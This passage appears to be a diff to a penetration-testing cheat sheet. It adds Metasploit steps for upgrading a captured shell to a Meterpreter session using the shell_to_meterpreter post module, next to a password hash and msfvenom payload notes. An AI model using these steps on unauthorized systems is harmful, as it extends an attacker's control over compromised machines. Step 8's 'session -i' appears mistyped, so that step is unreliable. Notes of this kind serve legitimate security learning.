@@ -389,6 +389,18 @@ $6$Sy0NNIXw$SJ27WltHI89hwM5UxqVGiXidj94QFRm2Ynp9p9kxgVbjrmtMez9EqXoDWtcQd8rf0tjc
 ### Meterpreter Flavors
 `msfvenom --list payloads | grep meterpreter`  
 
+### Upgrade Normal Shell To Meterpreter Shell
+Step 1: Background the current(Normal Shell) session, we can do this by pressing CTRL+Z  
+Step 2: Now Run the following command `search shell_to_meterpreter`.  
+Step 3: Use the shown module by following the command
+`use post/multi/manage/shell_to_meterpreter` or by simply typing
+`use 0`.  
+Step 4: Now we have to configure which Session shell to upgrade. We can see the Session by running the following command i.e `sessions -l`. Id=Session-Number  
+Step 5: We can see the Options, by using the `show options` command.  
+Step 6: Set the session-id according to your session. We can use the following command to configure the session i.e `set SESSION <id-of session>` in my case `set SESSION 1`.  
+Step 7: After you configure your session, it’s time to execute it. We can execute by simply giving the following command → `run`  
+Step 8: Now execute the new session by running the following command `session -i <New-meterpeter-session>` in my case, it’s `session -i 2`  
+
 ### Meterpreter Commands  
 ```
 meterpreter > help
